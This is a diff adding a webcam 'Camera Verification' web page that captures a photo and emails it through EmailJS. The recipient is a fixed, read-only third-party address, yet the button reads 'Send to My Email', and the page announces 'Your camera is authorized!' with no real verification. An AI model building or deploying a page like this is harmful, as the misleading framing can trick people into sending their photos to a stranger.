@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Verification</title>
+    <style>
+        video, img {
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+        #captureButton, #sendButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        #statusMessage {
+            margin-top: 20px;
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Camera Verification</h1>
+    <video id="video" autoplay></video>
+    <button id="captureButton">Capture Photo</button>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <img id="photo" alt="Captured Image" style="display:none;" />
+    
+    <div>
+        <label for="userEmail">Send to Email:</label>
+        <input type="email" id="userEmail" value="isharwebdeveloper@gmail.com" readonly />
+    </div>
+
+    <button id="sendButton" style="display:none;">Send to My Email</button>
+    <div id="statusMessage" style="display: none;">Your camera is authorized!</div>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
+        })();
+
+        const video = document.getElementById('video');
+        const captureButton = document.getElementById('captureButton');
+        const canvas = document.getElementById('canvas');
+        const photo = document.getElementById('photo');
+        const sendButton = document.getElementById('sendButton');
+        const userEmail = document.getElementById('userEmail');
+        const statusMessage = document.getElementById('statusMessage');
+        const context = canvas.getContext('2d');
+
+        // Access the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                statusMessage.style.display = 'block';
+            })
+            .catch(err => {
+                console.error("Error accessing the camera: ", err);
+                statusMessage.style.color = 'red';
+                statusMessage.textContent = 'Error: Camera access denied.';
+                statusMessage.style.display = 'block';
+            });
+
+        // Capture the photo
+        captureButton.addEventListener('click', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/png');
+            photo.src = dataURL;
+            photo.style.display = 'block';
+            sendButton.style.display = 'inline-block'; // Show send button
+        });
+
+        // Send photo via email
+        sendButton.addEventListener('click', () => {
+            const imageData = photo.src;
+            const emailToSend = userEmail.value;
+
+            const templateParams = {
+                to_email: emailToSend, // Use the email from the input
+                message: 'Here is the captured photo',
+                image: imageData
+            };
+
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                .then((response) => {
+                    console.log('SUCCESS!', response.status, response.text);
+                    alert('Email sent successfully!');
+                }, (err) => {
+                    console.error('FAILED...', err);
+                    alert('Error sending email. Please try again.');
+                });
+        });
+    </script>
+
+</body>
+</html>
